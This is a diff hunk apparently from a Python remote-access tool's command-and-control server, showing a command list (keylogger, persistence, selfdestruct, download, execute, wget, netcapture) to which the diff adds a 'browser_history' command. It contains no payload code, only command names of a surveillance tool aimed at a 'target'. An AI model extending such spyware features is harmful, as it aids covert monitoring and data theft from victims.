@@ -67,7 +67,7 @@ keylogger           - Active keylogger on the target.
 netcapture          - Launch a capture on the target.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
              'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'upload', 'wget', 'keylogger', 'netcapture' ]
+             'unzip', 'upload', 'wget', 'keylogger', 'netcapture', 'browser_history' ]
 
 
 class Server(threading.Thread):
